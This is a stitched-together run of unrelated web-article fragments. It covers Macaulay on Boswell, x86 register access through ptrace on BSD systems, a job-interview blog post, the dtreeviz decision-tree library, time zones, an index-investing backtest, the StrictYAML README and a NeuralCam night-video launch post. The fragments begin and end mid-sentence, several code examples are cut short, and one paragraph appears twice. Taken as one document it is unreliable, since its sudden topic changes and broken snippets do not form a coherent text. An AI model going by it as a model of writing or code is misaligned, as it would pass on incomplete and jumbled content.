when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

            <div>
              
              <article>

<p>Welcome back! Let’s continue the previous post on my <a href="https://jmmv.dev/2020/10/bye-google-hi-microsoft.html">reasons for moving from Google to Microsoft</a> by looking at my whole interviewing process. I’ve been asked by a few peers to narrate this story because they are curious to know how this process looked like for a person with 10+ years of professional experience. And, well, it’s just a topic I wanted to write about anyway 😉.</p>

<p>As a reminder, and to pique your interest, I applied for:</p>

<ul>
<li>🟦 a Software Engineer (SWE) position at Facebook;</li>
<li>🟦 a Production Engineer (PE) position at Facebook;</li>
<li>⚫ a Software Engineer (SWE) position at Twitter in their Build Efficiency team;</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Data product; and</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Storage product.</li>
</ul>

<p>That’s a total of 5 applications and talks with ~40 different people. Of those, the position in Azure Data vanished before I even interviewed, but I successfully <em>got to the offer stage for the other 4</em>. I entered this whole endeavor fixated on joining Facebook but… along the way, I uncovered exciting opportunities throughout, making my choice exceedingly difficult. In the end, I swerved towards the Azure Storage position for various reasons, but it’d have gone either way.</p>

<p>In this post, I want to be as honest and open as possible about <em>my personal situation</em> and how it related to the processes. As a result, some of the things I say might sound like a borderline rant—but that’s not the intention. Lastly, remember that interviewing always comes with the need to sign an NDA, so I cannot go into a lot of details.</p>



<p>Before we get into the processes, let’s talk about… career ladder <em>levels</em>! Uh, so exciting.</p>

<p>Levels are a very important topic for this discussion because each of the positions I applied to was attached to a specific level. The positions’ level significantly influenced how I went about zeroing in on my final choice. Beware that my view on this topic is through Google-tinted glasses and doesn’t necessarily apply to all companies—although I believe it does for the companies I talked to.</p>

<p>You see, recruiters and higher-level peers will often tell you not to get obsessed with levels or promotion: <em>“levels don’t matter”</em>, they’ll happily say. In principle, the people you work with know how you work in practice so the level you are at is irrelevant, and higher compensation can be achieved without promotion. Yes, compensation is weird: you can be paid more at a lower level by constantly exceeding expectations than at a higher level by just cruising.</p>

<p>In reality, however, I believe levels <em>do</em> matter a lot, even for an Individual Contributor (IC, non-manager) position. Here is why:</p>

<ul>
<li><p>Being at a higher level influences the kind of opportunities you are <em>exposed</em> to work on. You’d like to think that expertise and recognition do that instead: and they definitely do, but only within the realm of your team. Once you have to deal with teams and managers that don’t know you personally, the level you hold conveys that information. And thus the same applies when you land at a new company where nobody knows anything about you.</p></li>

<li><p>Being at a higher level grants you extra responsibilities and expectations—and I say <em>grant</em> because I think those are great traits. I personally want to grow in these areas, and I know that getting a higher title will subconsciously influence me to behave differently, just as it happened once I go the not-officially-recognized Tech Lead job within my team.</p></li>
</ul>

<p>NOTE: This is a good chance to visit <a href="https://www.levels.fyi/">levels.fyi</a>. Familiarize yourself with how levels map across companies and how they overlap across them. What’s <strong>not</strong> depicted there are the actual responsibilities of each level, nor that level compensation bans overlap <em>within a company</em>.</p>

<p>You might be wondering why any of this is important during the interviewing process. In fact, if all you care about is higher compensation, then this isn’t very important.</p>

<p>For me, though, my personal situation was problematic in finding the right position. I had been at the Senior (L5) level at Google for 5 years now, trying to make the jump into Staff (L6) territory for at least 3 of those years. My management chain and direct peers had been supportive of this promotion for quite a while now, and I am convinced my work did too. As a result, my compensation matched that: I was at the top of the Senior level band.</p>

<p>This unofficial recognition, however, is not reflected anywhere: you have to believe me at face value. For anyone that doesn’t know me within or outside the company, I’m an L5—and that can mean <em>a lot</em> of different things because of how broad levels are. One might be at the lower level, struggling to keep up with the demands and being paid the bare minimum; one can be in the middle, having a comfortable and non-stressful life with a good salary; and one can be at the top, trying to make the leap into the next band.</p>

<p>Unfortunately for me, the jump into the Staff level didn’t materialize at Google, dare I say… due to process failures. Promotions are a game and it is a game I did not play well; keep that in mind if you want them. But I didn’t want the job change to <em>feel</em> like a step down. <strong>My goal was to get hired as a Google L6-equivalent position elsewhere</strong> to properly reflect my skills, to make me uncomfortable enough to grow new skills, and to not have to prove myself all over again, which would take a long time.</p>



<p>Dealing with different companies at the same time was an exhausting, but important, process. As a reminder: if you want to have any leverage during offer negotiations, you ought to have other offers on the table. In the end, and as we shall see later, these weren’t very useful for my own negotiations (other things were), but they were eye-opening as I got to witness that there are exciting opportunities everywhere.</p>

<p>Given the many people I talked to (about 40) and the length of the process, I took copious notes each time I interacted with anyone. Specifically, I captured the names of each person I talked to and what they did at each company. I also captured anything the recruiters said in order to prevent future misunderstandings, because sometimes they contradicted what others had previously said.</p>

<p>Below is the full timeline. I know it’s long but I want to show how all the processes interwove. To that end, I have color- and shape-coded entries: Facebook is 🟦, Twitter is ⚫, and Microsoft is 💚:</p>

<p>Decision trees are the fundamental building block of <a href="http://explained.ai/gradient-boosting/index.html">gradient boosting machines</a> and <a href="https://en.wikipedia.org/wiki/Random_forest">Random Forests</a>™, probably the two most popular machine learning models for structured data.  Visualizing decision trees is a tremendous aid when learning how these models work and when interpreting models.  Unfortunately, current visualization packages are rudimentary and not immediately helpful to the novice. For example, we couldn't find a library that visualizes how decision nodes split up the feature space. It is also uncommon for libraries to support visualizing a specific feature vector as it weaves down through a tree's decision nodes; we could only find one image showing this.</p>

<p>So, we've created a general package for <a href="https://github.com/scikit-learn/scikit-learn">scikit-learn</a> decision tree visualization and model interpretation, which we'll be using heavily in an upcoming <a href="https://mlbook.explained.ai/">machine learning book</a> (written with <a href="http://www.fast.ai/about/#jeremy">Jeremy Howard</a>).  Here's a sample visualization for a tiny decision tree (click to enlarge):</p>

<p><a href="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg" width="70%"></a></p>

<p>This article demonstrates the results of this work, details the specific choices we made for visualization, and outlines the tools and techniques used in the implementation. The visualization software is part of a nascent Python machine learning library called <a href="https://github.com/parrt/dtreeviz">dtreeviz</a>.  We assume you're familiar with the basic mechanism of decision trees if you're interested in visualizing them, but let's start with a brief summary so that we're all using the same terminology. (If you're not familiar with decision trees, check out <a href="http://course.fast.ai/ml">fast.ai's Introduction to Machine Learning for Coders MOOC</a>.)</p>



<h2 id="sec:1.1">1.1 Decision tree review</h2>


<p>A decision tree is a machine learning model based upon binary trees (trees with at most a left and right child).  A decision tree learns the relationship between observations in a training set, represented as feature vectors <span>x</span> and target values <span>y</span>, by examining and condensing training data into a binary tree of interior nodes and leaf nodes.  (Notation: vectors are in bold and scalars are in italics.)</p>

<p>Each leaf in the decision tree is responsible for making a specific prediction. For regression trees, the prediction is a value, such as price.  For classifier trees, the prediction is a target category (represented as an integer in scikit), such as cancer or not-cancer. A decision tree carves up the feature space into groups of observations that share similar target values and each leaf represents one of these groups.  For regression, similarity in a leaf means a low variance among target values and, for classification, it means that most or all targets are of a single class.</p>

<p>Any path from the root of the decision tree to a specific leaf predictor passes through a series of (internal) decision nodes. Each decision node compares a single feature's value in <span>x</span>, <span>x<sub>i</sub></span>, with a specific <i>split point</i> value learned during training. For example, in a model predicting apartment rent prices, decision nodes would test features such as the number of bedrooms and number of bathrooms. (See <b>Section 1.5.3</b> <i>Visualizing tree interpretation of a single observation</i>.) Even in a classifier with discrete target values, decision nodes still compare numeric <i>feature</i> values because scitkit's decision tree implementation assumes that all features are numeric. Categorical variables must be <a href="https://machinelearningmastery.com/how-to-one-hot-encode-sequence-data-in-python/">one hot encoded</a>, <a href="https://www.analyticsvidhya.com/blog/2015/11/easy-methods-deal-categorical-variables-predictive-modeling/">binned</a>, <a href="http://forums.fast.ai/t/to-label-encode-or-one-hot-encode/6057">label encoded</a>, etc... </p>

<p>To train a decision node, the model examines a subset of the training observations (or the full training set at the root). The node's feature and split point within that feature space are chosen during training to split the observations into left and right buckets (subsets) to maximize similarity as defined above. (This selection process is generally done through exhaustive comparison of features and  feature values.) The left bucket has observations whose <span>x<sub>i</sub></span> feature values are all less than the split point and the right bucket has observations whose <span>x<sub>i</sub></span> is greater than the split point.   Tree construction proceeds recursively by creating decision nodes for the left bucket and the right bucket.  Construction stops when some stopping criterion is reached, such as having less than five observations in the node.</p>



<h2 id="sec:1.2">1.2 The key elements of decision tree visualization</h2>


<p>Decision tree visualizations should highlight the following important elements, which we demonstrate below.</p>
<ul>
<li>Decision node <b>feature versus target value</b> distributions (which we call feature-target space in this article). We want to know how separable the target values are based upon the feature and a split point.</li>
<li>Decision node <b>feature name and feature split value</b>.  We need to know which feature each decision node is testing and where in that space the nodes splits the observations.</li>
<li><b>Leaf node purity</b>, which affects our prediction confidence. Leaves with low variance among the target values (regression) or an overwhelming majority target class (classification) are much more reliable predictors.</li>
<li><b>Leaf node prediction value</b>.  What is this leaf actually predicting from the collection of target values?</li>
<li><b>Numbers of samples in decision nodes</b>.  Sometimes it's useful to know where all most of the samples are being routed through the decision nodes.</li>
<li><b>Numbers of samples in leaf nodes</b>.  Our goal is a decision tree with fewer, larger and purer leaves. Nodes with too few samples are possible indications of overfitting.</li>
<li>How a specific feature vector is <b>run down the tree</b> to a leaf. This helps explain why a particular feature vector gets the prediction it does. For example, in a regression tree predicting apartment rent prices, we might find a feature vector routed into a high predicted price leaf because of a decision node that checks for more than three bedrooms.</li>
</ul>

<h2 id="sec:1.4">1.4 A comparison to previous state-of-the-art visualizations</h2>


<p>If you search for “visualizing decision trees” you will quickly find a <b>Python</b> solution provided by the awesome scikit folks: <a href="http://scikit-learn.org/stable/modules/generated/sklearn.tree.export_graphviz.html">sklearn.tree.export_graphviz</a>.  With more work, you can find visualizations for <a href="http://scikit-learn.org/stable/modules/tree.html">R</a> and even <a href="http://support.sas.com/documentation/cdl/en/vaug/68027/HTML/default/viewer.htm#n0q3i0zwng79kin1kb1zvpo9k312.htm">SAS</a> and <a href="https://www.ibm.com/support/knowledgecenter/en/SS4QC9/com.ibm.solutions.wa_an_overview.2.0.0.doc/wa_discover_viz_expl_insigths_dec_tree.html">IBM</a>. In this section, we collect the various decision tree visualizations we could find and compare them to the visualizations made by our <span>dtreeviz</span> library. We give a more detailed discussion of our visualizations in the next section.</p>

<p>Let's start with the <a href="http://scikit-learn.org/stable/modules/tree.html">default scitkit visualization</a> of a decision tree on the well-known <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_iris.html#sklearn.datasets.load_iris">Iris</a> data set (click on images to enlarge).</p>

<p>The scikit tree does a good job of representing the tree structure, but we have a few quibbles.  The colors aren't the best and it's not immediately obvious why some of the nodes are colored and some aren't.  If the colors represent predicted class for this classifier, one would think just the leaves would be colored because only leaves have predictions. (It turns out the non-colored nodes have no majority prediction.) Including the gini coefficient (certainty score) costs space and doesn't help with interpretation. The count of samples of the  various target classes in each node is somewhat useful, but a histogram would be even better. A target class color legend would be nice.  Finally, using true and false as the edge labels isn't as clear as, say, labels <img src="https://explained.ai/decision-tree-viz/images/eqn-524A50782178998021A88B8CD4C8DCD8-depth000.51.svg"> and <img src="https://explained.ai/decision-tree-viz/images/eqn-4EDC933D28BFE3F5EFFE94BF892DAD38-depth001.72.svg">. The most obvious difference is that our decision nodes show feature distributions as overlapping stacked-histograms, one histogram per target class. Also, our leaf size is proportional to the number of samples in that leaf.</p>

<p>Scikit uses the same visualization approach for decision tree regressors. For example, here is scikit's visualization using the <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_boston.html">Boston</a> data set, with <span>dtreeviz</span>'s version for comparison (click to enlarge images):</p>

<p>In the scikit tree, it's not immediately clear what the use of color implies, but after studying the image, darker images indicate higher predicted target values. As before, our decision nodes show the feature space distribution, this time using a feature versus target value scatterplot.  The leaves use strip plots to show the target value distribution; leaves with more dots naturally have a higher number of samples.</p>

<p><b>R</b> programmers also have access to a package for <a href="http://blog.revolutionanalytics.com/2013/06/plotting-classification-and-regression-trees-with-plotrpart.html">visualizing decision trees</a>, which gives similar results to scikit but with nicer edge labels:</p>

					<p>My aunt has a problem</p><p>She loves joining Zoom meetings, but they're all hosted in different time zones. It's hard to remember if she should add 4 hours, subtract 3, or what. She's not the most technical person, so google isn't an option. She has to ask for help.</p><p>Every. Single. Time.</p><p>And, for the less technically minded, it's also error-prone.</p><p>Last a couple weeks ago I thought:</p><p>What if event organizers could share a link that would do the work for you?

One after another, I kept learning the falsehood of yet another "fact" that had seemed obviously true.

If that wasn't enough fun, there's also the political implications of recognizing certain time zones such as Israel Standard Time.</p><p>Some developers took the safer route and identified time zones only by the name of a prominent city in it, not bothering to map it to a common name. That's why the Ubuntu time zone picker makes you select "New York'' instead of Eastern Standard Time.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-4.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-4.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-4.png 826w" sizes="(min-width: 720px) 720px"></figure><h4 id="forget-time-zones-use-the-raw-utc-offset">Forget time zones, use the raw UTC offset</h4><p>W3's international standard gave up on the notion of time zones and declared that engineers should only store a timestamp's<a href="https://www.w3.org/TR/NOTE-datetime"> raw UTC offset</a>.</p><h4 id="gps-coordinates">GPS Coordinates</h4><p>Fun fact: Many APIs for getting a region's UTC offset only want a UTC time and latitude/longitude coordinates.

                    <p>For quite some time I've been monitoring the markets, and waiting for a dip to invest my cash. However, a few weeks ago I decided to put this assumption to the test. Is buying the dip the best I could do with my hard earned cash?</p><ul><li>Like most employees, I have a salary and some yearly disposable income to dedicate to my long term savings or investments. Concretely, I have about <strong>£20000 a year to dedicate to my investments</strong>.</li><li>I decided to <strong>invest only on indexes</strong>, because I got burned with individual stocks (and crypto) multiple times (a.k.a. I am a terrible investor).</li><li><strong>Long term investments only</strong>. Monitoring the market daily/hourly is a massive drain of energy and time that I could dedicate to generate more cash to invest.</li></ul><ul><li>Buy daily same amount (Hardcore <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy monthly same amount (Simple <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy yearly same amount (Extremely simple <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy the dip (My own <em>shitty-wait-for-it-and-spend-shit-tons-of-time-monitoring strategy</em>)</li></ul><p>I used Python + <a href="https://github.com/mementum/backtrader">Backtrader library</a> to simulate my scenarios, and these were the results investing on the SPY ETF, ignoring commission fees because my broker offers zero commission transactions.</p><figure><img src="https://carlosbaraza.com/content/images/2020/10/index-strategies.jpg"></figure><p>This experiment was quite revealing for me, because it showed me that the return of investment (ROI) for spending 27 years monitoring the markets daily could easily be negative, compared with a hands-off strategy like dollar cost averaging monthly to the SPY.</p><p>If previous return history is an indicative of future returns, the extra time dedicated to monitoring the market without a clear edge is a waste of time, which is also a waste of money.</p><p><strong>The main takeaway is don't try to beat the market, just invest at set intervals on some diversified indexes, and don't look back, regardless of what the market does. Spend the extra time generating more cash to invest, and the magic of compounding and dollar cost averaging will do the rest.</strong></p><p><a href="https://twitter.com/carlosbaraza">Follow me on Twitter @carlosbaraza</a> if you like this type of content and I'll make more.</p><p>Other notes:</p><ul><li>The difference between investing daily, monthly and even yearly is pretty much negligible long term. Short term, it makes a bigger difference, being daily the best approach if your broker offers zero commissions.</li><li>This strategy depends on the market continuing appreciating. If the market was ever to reverse permanently, this strategy, and pretty much every strategy would fail.</li></ul><p>I am not a professional investor, nor a financial advisor, and arguably not even a good amateur investor 😜. This is just a simple experiment I run because I waste a lot of time and energy monitoring the market. </p>

<p>StrictYAML is a <a href="https://en.wikipedia.org/wiki/Type_safety">type-safe</a> YAML parser
that parses and validates a <a href="https://hitchdev.com/strictyaml/features-removed">restricted subset</a> of the <a href="https://hitchdev.com/strictyaml/what-is-yaml">YAML</a>
specification.</p>

<p>Priorities:</p>

<ul>
<li>Beautiful API</li>
<li>Refusing to parse <a href="https://hitchdev.com/strictyaml/features-removed">the ugly, hard to read and insecure features of YAML</a> like <a href="https://hitchdev.com/strictyaml/why/implicit-typing-removed">the Norway problem</a>.</li>
<li>Strict validation of markup and straightforward type casting.</li>
<li>Clear, readable exceptions with <strong>code snippets</strong> and <strong>line numbers</strong>.</li>
<li>Acting as a near-drop in replacement for pyyaml, ruamel.yaml or poyo.</li>
<li>Ability to read in YAML, make changes and write it out again with comments preserved.</li>
<li><a href="https://hitchdev.com/strictyaml/why/speed-not-a-priority">Not speed</a>, currently.</li>
</ul>

<p>Simple example:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span><span>
</span><span></span>possessions<span>:</span><span>
</span><span></span>-<span> </span>Towel</code></pre></div><div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span></code></pre></div>
<p>Default parse result:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span>
<span>YAML</span><span>(</span><span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])]))</span></code></pre></div>
<p>All data is string, list or OrderedDict:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span><span>.</span><span>data</span>
<span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])])</span></code></pre></div>
<p>Quickstart with schema:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<p>42 is now parsed as an integer:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>person</span><span>.</span><span>data</span>
<span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>42</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])])</span></code></pre></div>
<p>A YAMLError will be raised if there are syntactic problems, violations of your schema or use of disallowed YAML features:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span></code></pre></div>
<p>For example, a schema violation:</p>
<div><pre><code data-lang="python"><span>try</span><span>:</span>
    <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>except</span> <span>YAMLError</span> <span>as</span> <span>error</span><span>:</span>
    <span>print</span><span>(</span><span>error</span><span>)</span></code></pre></div><div><pre><code data-lang="yaml">while<span> </span>parsing<span> </span>a<span> </span>mapping<span>

</span><span>    </span>^<span> </span>(line<span>:</span><span> </span><span>3</span>)</code></pre></div>
<p>If parsed correctly:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<p>You can modify values and write out the YAML with comments preserved:</p>
<div><pre><code data-lang="python"><span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>

          <div>
            

<p>Hey everyone, <br>

for the past few months we have been working on a new product, and today we’re finally ready to show it to you.
</p>

<div><p>As you probably know, at NeuralCam we have a <a href="https://apps.apple.com/us/app/neuralcam-nightmode/id1474856599" target="_blank">photo NightMode app</a> that’s recognized as the leading night mode solution for iPhones without a built-in photo Night Mode. Ever since the launch of our night mode app, a question kept popping up from our users: <i>“can you build a night mode app for video?”</i>, they asked. 
</p><p>

We’ve pondered this for a while. Unlike photography, there is no obvious straightforward way to build night mode for video. In the case of photos, night mode usually means taking multiple shots with relatively long exposure and combining them into one high quality image. Then brightening and post-processing it for a final look. 

 </p></div>



<p><b>Video</b> is a different beast: you can’t just shoot multiple frames and combine them because you’re limited by both the maximum exposure time a frame can have and by the maximum processing time per frame (milliseconds instead of seconds in the case of real-time video). 

</p>

<p>Clearly, a very different approach is needed. We’ve explored everything from classic to AI-powered video processing techniques and we think we found the right mix of tech that results in much improved low light videos. After months of researching, hacking and developing, we’re proud to present NeuralCam NightVideo, our (and perhaps the world’s first) <b>Video Night Mode</b> app.

</p>
<p><img src="https://neural.cam/news/nightvideo/content/nvid.png">
</p>
<br>

<h3 id="when-they-ghost-mid-project">Night Mode Video</h3>

<p>So how can we build Video NightMode? Where do we get started and why can’t we just take a normal video and brighten it up? Well, because it would look really bad.
</p>

<p>The biggest problem in low light videography (and photography for that matter) is the presence of noise. There’s just too little amount of light hitting the image sensor and this lack of information results in a flickering mess of pixels with different light intensities and colors appearing especially in the darker areas of the scene - not a pleasant view.
</p>
<p>In the case of the photography night mode, this noise is reduced by the mentioned frame merging process - which basically results in more information being added to the target frame. However, with video we don’t have the luxury of multiple frames and processing for seconds to do the processing so we’ll clearly have to find a very different approach. 

</p><h3 id="when-they-ghost-mid-project">Capturing and AI frame-boosting</h3>

<p>The first thing we’re doing is to try to capture the most light inside each frame, which naturally results in less noisy frames. 

</p>

<p>As a standard practice, videos are shot at a shutter speed of no more than 1/24 to keep moving objects sharp and the video smooth. But this also means that this is the maximum amount of time that light can reach the sensor.
</p>

<p>We’ve looked very closely at this problem and figured that there might be a way to let more light in while maintaining the smooth look of the video, namely a combination of longer exposure times and frame interpolation. This way we can use exposure times longer than 1/24 depending on the amount of available light, and then in order to keep the video looking smooth, we generate additional frames using a proprietary Machine Learning powered Video Interpolation algorithm that we’ve built especially for this purpose.</p>

<p>
 The result is a smooth video with a tiny amount of blur - depending on the used settings - and generally a nice “night video” look.

</p>

<p><img src="https://neural.cam/news/nightvideo/content/interp.png">
<br>
</p>



<h3 id="when-they-ghost-mid-project">AI Powered Video Denoising</h3>


<p>Doing the capturing part this way we’ve got higher quality frames, but these generally still have a lot of noise so what we’ll do next is to try to get rid of that.
</p>

<p>It turns out that classic denoising methods aren’t good enough for this case, they usually blur the whole image, including edges and are helpless at the noise levels present in low light shots taken with a smartphone camera. Also, they’re quite slow as well.
</p>

<p>To solve this problem we’ve built a Machine Learning-based denoising algorithm. Specially developed for the iPhone camera, it removes even the heaviest noise and does so selectively and adaptively only on the areas of the image where noise is present. The result is a much cleaner look in the bright areas of the video and a massive reduction of the ugly flickering effect in the darker parts of the image.

</p>

<h3>Brightening</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<h3>Different Video Night Modes</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<br>
</p>
<p>In order to cover as many shooting situations as possible we’ve come up with 5 different capture modes:

</p>



<h4>Day:
</h4>



<p>The first capturing mode is not even a night mode at all. It is targeted at lower light day shots, or scenes with high dynamic range where the results of the default iPhone camera start to get too noisy. This mode contains no brightening, but because of the use of our AI denoising algorithm, resulting videos have a cleaner, more pleasant look. It’s especially useful when used with the ultra wide camera, in the case of which noise can appear even in medium-lit indoor situations.

</p>

<h4>Dusk:</h4>

<p>
  
  This mode is designed for semi-low light. It is similar to Day mode, shot at a high frame rate to maintain sharp subjects in high movement situations, but in addition to denoising it also includes a bit of additional brightening. 

</p>
<h4>
Night:
</h4>

<p>The “Night” mode is the default mode for shooting night videos. It uses a slightly longer exposure time, that combined with our denoising and frame interpolation algorithms generates a bright, clean and smooth night video. This is the mode to use for most night scenes. 
</p>

<br>
</p>


<h4>Night+:</h4>

<p>A further enhanced mode for really dark scenes. In this mode, videos have an additional amount of blur but provide a brighter night video with the same clean noise-less look. In most of these situations the built-in camera can't produce usable results.

</p>

<h4>Time-lapse:</h4>

<p>A Night Time-lapse mode, similar to the one on the new iPhone 12 default camera - now made available by NeuralCam NightVideo for older iPhones too. This mode doesn’t have sound and can handle even lower light situations, which combined with a faster playback, generates the specific night mode time-lapse look.

<br>
</p>

<h4>*Gentle Light:</h4>

<p>Each of the modes can be combined with the “gentle light” feature, where the app turns on the flashlight, but at one of the lowest levels in order to keep the resulting video still natural and avoid “blinding” people. Gentle light can be used in totally dark scenes with subjects that are close enough to be illuminated by a small amount of light.
</p>

<h3>Real-time on-device processing</h3>

